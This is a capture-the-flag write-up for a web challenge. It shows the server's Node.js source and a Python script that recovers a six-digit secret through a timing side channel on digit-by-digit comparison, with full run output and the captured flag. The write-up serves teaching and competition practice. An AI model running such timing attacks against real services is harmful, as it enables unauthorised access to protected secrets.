Log Me In (25)
==============

## Description
[https://cf9-jackpot-dtbznhqsyf.now.sh/](https://cf9-jackpot-dtbznhqsyf.now.sh/)

## Write up

Since we are given a [now.sh](https://now.sh/) website, we can see the source through
[/_src](https://cf9-jackpot-dtbznhqsyf.now.sh/_src) path, let's see `index.js`:

```js
const Koa = require('koa');
const route = require('koa-route');
const serve = require('koa-static');
const bodyParser = require('koa-bodyparser');
const crypto = require('crypto-promise');
const config = require('./config.json');

const app = new Koa();

async function getJackpot() {
  const decipher = crypto.decipher('aes256', process.env.SECRET);
  const jackpot = await decipher(process.env.JACKPOT, 'hex');
  // prevent bruteforce
  await new Promise(resolve => setTimeout(resolve, 1000));
  return jackpot.toString();
}

app.use(bodyParser());

app.use(async function(ctx, next) {
  const start = new Date();
  await next();
  const ms = new Date() - start;
  ctx.set('X-Response-Time', `${ms}ms`);
});

app.use(serve('client'));

app.use(
  route.post('/', async ctx => {
    const { ticket } = ctx.request.body;

    let flag = true;
    for ([index, _] of new Array(6).entries()) {
      const jackpot = await getJackpot();
      flag &= jackpot[index] === ticket[index];
      if (!flag) break;
    }

    if (flag) ctx.body = `Congratulations! The flag is ${process.env.FLAG}`;
    else ctx.body = 'Sorry, try again later!';
  })
);

const { port } = config;
app.listen(port);
console.log(`Listening on port ${port}`);
```

We can see that it checks for the ticket against the jackpot value one by one. But fetching the jackpot value
takes considerable amount of time, that is ~1s per index. We can exploit this for a timing attack:

```python
#!/usr/bin/env python
import requests

jackpot = ''

for idx in range(0, 6):

    longest = 0
    longest_num = None

    for num in range(0, 10):
        ticket = '{}{}{}'.format(jackpot, num, '0' * (5-idx))
        r = requests.post('https://cf9-jackpot-dtbznhqsyf.now.sh/', { 'ticket': ticket })
        time = int(r.headers['X-Response-Time'].split('ms')[0])
        print('[{}ms] {}'.format(time, ticket))

        if 'Sorry' not in r.text:
            print('[!] Success: {}'.format(r.text))
            exit()

        if (time > longest):
            longest = time
            longest_num = num

    jackpot += str(longest_num)

print('[!] Jackpot = {}'.format(jackpot))
```

Run:

```
❯ python 150-jackpot.py
[1000ms] 000000
[1000ms] 100000
[1003ms] 200000
[1001ms] 300000
[1001ms] 400000
[2003ms] 500000
[1003ms] 600000
[1001ms] 700000
[1001ms] 800000
[1005ms] 900000
[2002ms] 500000
[2002ms] 510000
[2002ms] 520000
[2010ms] 530000
[2003ms] 540000
[2002ms] 550000
[2003ms] 560000
[3003ms] 570000
[2002ms] 580000
[2003ms] 590000
[3004ms] 570000
[3020ms] 571000
[4007ms] 572000
[3002ms] 573000
[3013ms] 574000
[3009ms] 575000
[3009ms] 576000
[3004ms] 577000
[3005ms] 578000
[3004ms] 579000
[4015ms] 572000
[4010ms] 572100
[4004ms] 572200
[4006ms] 572300
[4003ms] 572400
[4006ms] 572500
[5007ms] 572600
[4004ms] 572700
[4005ms] 572800
[4006ms] 572900
[5007ms] 572600
[6005ms] 572610
[5005ms] 572620
[5005ms] 572630
[5006ms] 572640
[5006ms] 572650
[5007ms] 572660
[5007ms] 572670
[5006ms] 572680
[5014ms] 572690
[6019ms] 572610
[6009ms] 572611
[6007ms] 572612
[6006ms] 572613
[!] Success: Congratulations! The flag is COMPFEST9{BRUTEFORC3_ALL_THE_THINGS}
```
